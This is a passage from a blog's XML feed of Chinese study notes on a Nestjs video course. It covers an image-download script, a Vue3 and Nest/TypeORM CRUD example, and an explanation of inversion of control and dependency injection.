class="string">&#x27;.gallery-data&#x27;</span>).<span class="title function_">eq</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> images = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(loadBtn.<span class="title function_">text</span>());</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(images);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>第三步：下载图片</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下载图片</span></span><br><span class="line">images.<span class="title function_">forEach</span>(<span class="keyword">async</span> (img) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> buffer = <span class="keyword">await</span> axios</span><br><span class="line">    .<span class="title function_">get</span>(img.<span class="property">url</span>, &#123; <span class="attr">responseType</span>: <span class="string">&#x27;arraybuffer&#x27;</span> &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="property">data</span>);</span><br><span class="line">  <span class="keyword">const</span> ws = fs.<span class="title function_">createWriteStream</span>(</span><br><span class="line">    path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../meme&#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() + <span class="string">&#x27;.jpg&#x27;</span>),</span><br><span class="line">  );</span><br><span class="line">  ws.<span class="title function_">write</span>(buffer);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>于是图片都下载到了：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308051917498.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>CRUD</title>
    <url>/web/study/Nestjs/20.CRUD.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h1><p>使用Vue3、TS和Element+构建的简单列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;wraps&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;el-input v-model=&quot;search.keyWord&quot; style=&quot;width:300px;&quot;&gt;&lt;/el-input&gt;</span><br><span class="line">      &lt;el-button @click=&quot;init&quot; style=&quot;margin-left:10px;&quot;&gt;搜索&lt;/el-button&gt;</span><br><span class="line">      &lt;el-button @click=&quot;openDialog&quot; type=&quot;primary&quot; style=&quot;margin-left:10px;&quot;&gt;添加&lt;/el-button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;el-table border :data=&quot;tableData&quot; style=&quot;width: 100%;margin-top: 30px;&quot;&gt;</span><br><span class="line">      &lt;el-table-column prop=&quot;name&quot; label=&quot;名字&quot; /&gt;</span><br><span class="line">      &lt;el-table-column prop=&quot;desc&quot; label=&quot;描述&quot; /&gt;</span><br><span class="line">      &lt;el-table-column prop=&quot;id&quot; label=&quot;id&quot; /&gt;</span><br><span class="line">      &lt;el-table-column&gt;</span><br><span class="line">        &lt;template #default=&quot;scope&quot;&gt;</span><br><span class="line">          &lt;el-button @click=&quot;edit(scope.row)&quot;&gt;编辑&lt;/el-button&gt;</span><br><span class="line">          &lt;el-button @click=&quot;deleteRow(scope.row)&quot;&gt;删除&lt;/el-button&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">      &lt;/el-table-column&gt;</span><br><span class="line">    &lt;/el-table&gt;</span><br><span class="line">    &lt;el-pagination @current-change=&quot;changeSize&quot; style=&quot;float:right;margin-top:10px;&quot; background</span><br><span class="line">        layout=&quot;prev, pager, next&quot; :total=&quot;total&quot; /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;el-dialog v-model=&quot;dialogVisible&quot; title=&quot;弹框&quot; width=&quot;50%&quot;&gt;</span><br><span class="line">  &lt;el-form :model=&quot;form&quot;&gt;</span><br><span class="line">    &lt;el-form-item prop=&quot;name&quot; label=&quot;名称&quot;&gt;</span><br><span class="line">      &lt;el-input v-model=&quot;form.name&quot; placeholder=&quot;名称&quot; /&gt;</span><br><span class="line">    &lt;/el-form-item&gt;</span><br><span class="line">    &lt;el-form-item prop=&quot;desc&quot; label=&quot;描述&quot;&gt;</span><br><span class="line">      &lt;el-input v-model=&quot;form.desc&quot; placeholder=&quot;描述&quot;&gt;</span><br><span class="line">      &lt;/el-input&gt;</span><br><span class="line">    &lt;/el-form-item&gt;</span><br><span class="line">  &lt;/el-form&gt;</span><br><span class="line">    &lt;template #footer&gt;</span><br><span class="line">      &lt;span class=&quot;dialog-footer&quot;&gt;</span><br><span class="line">        &lt;el-button @click=&quot;close&quot;&gt;关闭&lt;/el-button&gt;</span><br><span class="line">        &lt;el-button type=&quot;primary&quot; @click=&quot;save&quot;&gt;</span><br><span class="line">          保存</span><br><span class="line">        &lt;/el-button&gt;</span><br><span class="line">      &lt;/span&gt;</span><br><span class="line">    &lt;/template&gt;</span><br><span class="line">  &lt;/el-dialog&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script setup lang=&#x27;ts&#x27;&gt;</span><br><span class="line">import &#123; ref, reactive &#125; from &#x27;vue&#x27;</span><br><span class="line">import &#123; addUser, updateUser, delUser, getList &#125; from &#x27;./server&#x27;</span><br><span class="line">const total = ref&lt;number&gt;(0)</span><br><span class="line">//搜索框</span><br><span class="line">const search = reactive(&#123;</span><br><span class="line">  keyWord: &quot;&quot;,</span><br><span class="line">  page: 1,</span><br><span class="line">  pageSize: 10</span><br><span class="line">&#125;)</span><br><span class="line">//表单</span><br><span class="line">const form = reactive(&#123;</span><br><span class="line">  name: &quot;&quot;,</span><br><span class="line">  desc: &quot;&quot;,</span><br><span class="line">  id: 0</span><br><span class="line">&#125;)</span><br><span class="line">//清空数据</span><br><span class="line">const resetForm = reactive(&#123; ...form &#125;)</span><br><span class="line">//表格数据</span><br><span class="line">const tableData = ref([])</span><br><span class="line">//弹框开关</span><br><span class="line">const dialogVisible = ref&lt;boolean&gt;(false)</span><br><span class="line">// 打开弹窗</span><br><span class="line">const openDialog = () =&gt; &#123;</span><br><span class="line">  dialogVisible.value = true;</span><br><span class="line">  Object.assign(form, resetForm)</span><br><span class="line">&#125;</span><br><span class="line">//初始化表格数据</span><br><span class="line">const init = async () =&gt; &#123;</span><br><span class="line">  const result = await getList(search)</span><br><span class="line">  tableData.value = result?.data?.list ?? []</span><br><span class="line">  total.value = result?.data?.total ?? 0</span><br><span class="line">&#125;</span><br><span class="line">init()</span><br><span class="line">const changeSize = (page: number) =&gt; &#123;</span><br><span class="line">  search.page = page</span><br><span class="line">  init()</span><br><span class="line">&#125;</span><br><span class="line">//保存/修改表格数据</span><br><span class="line">const save = async () =&gt; &#123;</span><br><span class="line">  if (form.id) &#123;</span><br><span class="line">    await updateUser(form)</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    await addUser(form)</span><br><span class="line">  &#125;</span><br><span class="line">  close()</span><br><span class="line">  init()</span><br><span class="line">&#125;</span><br><span class="line">//删除表格数据</span><br><span class="line">const deleteRow = async (row: &#123; id: any; &#125;) =&gt; &#123;</span><br><span class="line">  await delUser(&#123; id: row.id &#125;)</span><br><span class="line">  init()</span><br><span class="line">&#125;</span><br><span class="line">//获取详情</span><br><span class="line">const edit = (row: any) =&gt; &#123;</span><br><span class="line">  dialogVisible.value = true;</span><br><span class="line">  Object.assign(form, row)</span><br><span class="line">&#125;</span><br><span class="line">//关闭弹框</span><br><span class="line">const close = () =&gt; &#123;</span><br><span class="line">  dialogVisible.value = false;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;style lang=&#x27;less&#x27;&gt;</span><br><span class="line">* &#123;</span><br><span class="line">  padding: 0;</span><br><span class="line">  margin: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html,</span><br><span class="line">body &#123;</span><br><span class="line">  background: #ccc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.wraps &#123;</span><br><span class="line">  height: 100vh;</span><br><span class="line">  padding: 30px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>使用Axios构建的接口：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"> </span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">baseURL</span> = <span class="string">&#x27;http://localhost:3000&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">addUser</span> = (<span class="params">data</span>) =&gt; axios.<span class="title function_">post</span>(<span class="string">&#x27;/user&#x27;</span>,data).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="property">data</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getList</span> = (<span class="params">data</span>) =&gt; axios.<span class="title function_">get</span>(<span class="string">&#x27;/user&#x27;</span>,&#123;<span class="attr">params</span>:data&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="property">data</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">delUser</span> = (<span class="params">data</span>) =&gt; axios.<span class="title function_">delete</span>(<span class="string">`/user/<span class="subst">$&#123;data.id&#125;</span>`</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="property">data</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">updateUser</span> = (<span class="params">data</span>) =&gt; axios.<span class="title function_">patch</span>(<span class="string">`/user/<span class="subst">$&#123;data.id&#125;</span>`</span>,data).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="property">data</span>)</span><br></pre></td></tr></table></figure>

<h1 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h1><p>Controller：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">Controller</span>,</span><br><span class="line">  <span class="title class_">Get</span>,</span><br><span class="line">  <span class="title class_">Post</span>,</span><br><span class="line">  <span class="title class_">Body</span>,</span><br><span class="line">  <span class="title class_">Patch</span>,</span><br><span class="line">  <span class="title class_">Param</span>,</span><br><span class="line">  <span class="title class_">Delete</span>,</span><br><span class="line">  <span class="title class_">Query</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CreateUserDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/create-user.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UpdateUserDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/update-user.dto&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> userService: UserService</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Post</span>()</span><br><span class="line">  <span class="title function_">create</span>(<span class="params"><span class="meta">@Body</span>() createUserDto: CreateUserDto</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">userService</span>.<span class="title function_">create</span>(createUserDto);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>()</span><br><span class="line">  <span class="title function_">findAll</span>(<span class="params"><span class="meta">@Query</span>() query: &#123; keyWord: <span class="built_in">string</span>; page: <span class="built_in">number</span>; pageSize: <span class="built_in">number</span> &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">userService</span>.<span class="title function_">findAll</span>(query);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Patch</span>(<span class="string">&#x27;:id&#x27;</span>)</span><br><span class="line">  <span class="title function_">update</span>(<span class="params"><span class="meta">@Param</span>(<span class="string">&#x27;id&#x27;</span>) id: <span class="built_in">string</span>, <span class="meta">@Body</span>() updateUserDto: UpdateUserDto</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">userService</span>.<span class="title function_">update</span>(+id, updateUserDto);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Delete</span>(<span class="string">&#x27;:id&#x27;</span>)</span><br><span class="line">  <span class="title function_">remove</span>(<span class="params"><span class="meta">@Param</span>(<span class="string">&#x27;id&#x27;</span>) id: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">userService</span>.<span class="title function_">remove</span>(+id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Service：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Injectable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CreateUserDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/create-user.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UpdateUserDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/update-user.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">InjectRepository</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Repository</span>, <span class="title class_">Like</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">User</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./entities/user.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    <span class="comment">// 依赖注入，@InjectRepository接收实体参数</span></span></span><br><span class="line"><span class="params">    <span class="comment">// @Repository接收实体泛型</span></span></span><br><span class="line"><span class="params">    <span class="meta">@InjectRepository</span>(User) <span class="keyword">private</span> <span class="keyword">readonly</span> user: Repository&lt;User&gt;,</span></span><br><span class="line"><span class="params">  </span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">create</span>(<span class="params">createUserDto: CreateUserDto</span>) &#123;</span><br><span class="line">    <span class="comment">// 创建实体实例</span></span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="comment">// 将DTO内容整理到实体实例身上</span></span><br><span class="line">    data.<span class="property">name</span> = createUserDto.<span class="property">name</span>;</span><br><span class="line">    data.<span class="property">desc</span> = createUserDto.<span class="property">desc</span>;</span><br><span class="line">    <span class="comment">// 保存实体实例</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">user</span>.<span class="title function_">save</span>(data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">findAll</span>(<span class="params">query: &#123; keyWord: <span class="built_in">string</span>; page: <span class="built_in">number</span>; pageSize: <span class="built_in">number</span> &#125;</span>) &#123;</span><br><span class="line">    <span class="comment">// 查询当前页</span></span><br><span class="line">    <span class="keyword">const</span> list = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">user</span>.<span class="title function_">find</span>(&#123;</span><br><span class="line">      <span class="comment">// 查询条件</span></span><br><span class="line">      <span class="attr">where</span>: &#123;</span><br><span class="line">        <span class="comment">// like用于模糊查询</span></span><br><span class="line">        <span class="attr">name</span>: <span class="title class_">Like</span>(<span class="string">`%<span class="subst">$&#123;query.keyWord&#125;</span>%`</span>),</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 排序方式</span></span><br><span class="line">      <span class="attr">order</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="string">&#x27;DESC&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 分页查询</span></span><br><span class="line">      <span class="comment">// 偏移量</span></span><br><span class="line">      <span class="attr">skip</span>: (query.<span class="property">page</span> - <span class="number">1</span>) * query.<span class="property">pageSize</span>,</span><br><span class="line">      <span class="comment">// 数量</span></span><br><span class="line">      <span class="attr">take</span>: query.<span class="property">pageSize</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 获取总页数</span></span><br><span class="line">    <span class="keyword">const</span> total = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">user</span>.<span class="title function_">count</span>(&#123;</span><br><span class="line">      <span class="attr">where</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="title class_">Like</span>(<span class="string">`%<span class="subst">$&#123;query.keyWord&#125;</span>%`</span>),</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      list,</span><br><span class="line">      total,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">update</span>(<span class="params">id: <span class="built_in">number</span>, updateUserDto: UpdateUserDto</span>) &#123;</span><br><span class="line">    <span class="comment">// 更新</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">user</span>.<span class="title function_">update</span>(id, updateUserDto);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">remove</span>(<span class="params">id: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 删除</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">user</span>.<span class="title function_">delete</span>(id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Module：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Module</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UserController</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./user.controller&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">TypeOrmModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">User</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./entities/user.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  <span class="attr">imports</span>: [<span class="title class_">TypeOrmModule</span>.<span class="title function_">forFeature</span>([<span class="title class_">User</span>])],</span><br><span class="line">  <span class="attr">controllers</span>: [<span class="title class_">UserController</span>],</span><br><span class="line">  <span class="attr">providers</span>: [<span class="title class_">UserService</span>],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">UserModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>DTO：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">CreateUserDto</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">desc</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Entity：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Column</span>, <span class="title class_">Entity</span>, <span class="title class_">PrimaryColumn</span>, <span class="title class_">PrimaryGeneratedColumn</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="meta">@Column</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;name&#x27;</span> &#125;)</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="meta">@Column</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;desc&#x27;</span> &#125;)</span><br><span class="line">  <span class="attr">desc</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>Nestjs设计模式</title>
    <url>/web/study/Nestjs/2.Nestjs%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="传统方式"><a href="#传统方式" class="headerlink" title="传统方式"></a>传统方式</h1><p>比如现在有三个类，其中B类和C类中需要用到A类的实例（也就是B类和C类依赖A类）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;yajue&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">  <span class="attr">a</span>:<span class="built_in">any</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span> = <span class="keyword">new</span> <span class="title function_">A</span>().<span class="property">name</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">  <span class="attr">a</span>:<span class="built_in">any</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span> = <span class="keyword">new</span> <span class="title function_">A</span>().<span class="property">name</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果将A类改为</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>B类和C类内部就开始飘红了</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307271551503.png"></p>
<p>说明这些类之间的耦合度较强（创建B类或C类时出现了A类本尊）</p>
<h1 id="IOC方式"><a href="#IOC方式" class="headerlink" title="IOC方式"></a>IOC方式</h1><p><a href="https://zhuanlan.zhihu.com/p/33492169">浅谈控制反转与依赖注入 - 知乎 (zhihu.com)</a></p>
<h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><p>全称Inversion of Control，控制反转</p>
<ul>
<li>高层模块不应该依赖低层模块，二者都应该依赖其抽象</li>
<li>抽象不应该依赖细节，细节应该依赖抽象</li>
</ul>
<h2 id="DI"><a href="#DI" class="headerlink" title="DI"></a>DI</h2><p>Dependency Injection，依赖注入，其实和IOC就是一个东西</p>
<p>由于控制反转概念比较含糊，所以2004年大师级人物Martin Fowler又给出了一个新的名字“依赖注入”</p>
<blockquote>
<p>可能IOC只容易被理解到容器控制对象这个层面，很难让人想到谁来维护对象关系</p>
</blockquote>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>Container用来收集并集中管理依赖，就是个IOC容器</p>
<p>当C类需要用到其他类时，构造器通过Container直接获取类的实例，就不用在C的内部创建实例了</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我是一个容器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Container</span> &#123;</span><br><span class="line">  <span class="attr">mod</span>:<span class="built_in">any</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">mod</span> = &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">provide</span>(<span class="params">key:<span class="built_in">string</span>,mod:<span class="built_in">any</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">mod</span>[key] = mod</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">get</span>(<span class="params">key:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">mod</span>[key]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 容器把A和B类收集起来啦</span></span><br><span class="line"><span class="keyword">const</span> mod = <span class="keyword">new</span> <span class="title class_">Container</span>()</span><br><span class="line">mod.<span class="title function_">provide</span>(<span class="string">&quot;a&quot;</span>,<span class="keyword">new</span> <span class="title function_">A</span>(<span class="string">&quot;yjsp&quot;</span>))</span><br><span class="line">mod.<span class="title function_">provide</span>(<span class="string">&quot;b&quot;</span>,<span class="keyword">new</span> <span class="title function_">B</span>(<span class="string">&quot;yajue&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我和A类、B类没有直接的依赖关系</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">  <span class="attr">a</span>:<span class="built_in">any</span></span><br><span class="line">  <span class="attr">b</span>:<span class="built_in">any</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">mod:Container</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">a</span> = mod.<span class="title function_">get</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">b</span> = mod.<span class="title function_">get</span>(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这使类们从复杂的关系中解耦，让程序可以单独拓展其他功能，也可以方便地加入其他模块，减少维护成本</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>事务</title>
    <url>/web/study/Nestjs/22.%E4%BA%8B%E5%8A%A1.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
